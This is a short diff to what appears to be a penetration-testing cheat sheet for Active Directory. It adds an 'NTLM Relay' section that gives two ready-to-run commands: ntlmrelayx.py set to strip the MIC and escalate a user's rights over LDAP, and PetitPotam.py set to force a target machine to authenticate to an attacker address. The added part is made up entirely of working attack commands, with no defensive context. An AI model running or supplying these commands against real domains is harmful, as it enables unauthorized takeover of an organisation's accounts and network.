@@ -55,6 +55,15 @@ add target domain /etc/hosts, if needed
 <target domain ip> <Active Directory Domain>
 ```
 
+NTLM Relay
+
+```shell
+# listening
+python3 ntlmrelayx.py --remove-mic --escalate-user hack -t ldap://<attacker ip> -smb2support  
+# 
+python3 PetitPotam.py -d <domain> -u <user> -p <password> <attacker ip> <target ip>
+```
+
 enumerate domain usernames
 
 ```shell
